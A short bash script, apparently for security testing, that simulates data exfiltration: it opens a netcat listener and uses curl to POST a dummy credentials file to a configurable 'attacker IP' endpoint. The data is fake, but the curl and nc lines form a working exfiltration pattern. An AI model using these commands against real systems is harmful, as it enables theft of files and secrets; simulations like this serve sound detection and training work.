#!/bin/bash

# Simulate data exfiltration using netcat and curl

ATTACKER_IP=${1:-"10.0.0.5"}
EXFIL_PORT=${2:-"4444"}

echo "[*] Setting up local listener on port $EXFIL_PORT..."
nc -lvp "$EXFIL_PORT" > exfiltrated_data.txt &
NC_PID=$!

sleep 2 # Wait for listener to initialize

echo "[*] Creating dummy sensitive data for simulation..."
if [ ! -f sensitive_data.txt ]; then
    echo "CONFIDENTIAL: user=admin pass=SuperSecret123!" > sensitive_data.txt
fi

echo "[*] Simulating exfiltration to attacker IP $ATTACKER_IP..."
curl -X POST -d @sensitive_data.txt "http://$ATTACKER_IP/exfiltrate" || echo "[!] Curl failed to connect. Simulation logged."

kill $NC_PID 2>/dev/null
echo "[*] Exfiltration attack simulation executed"
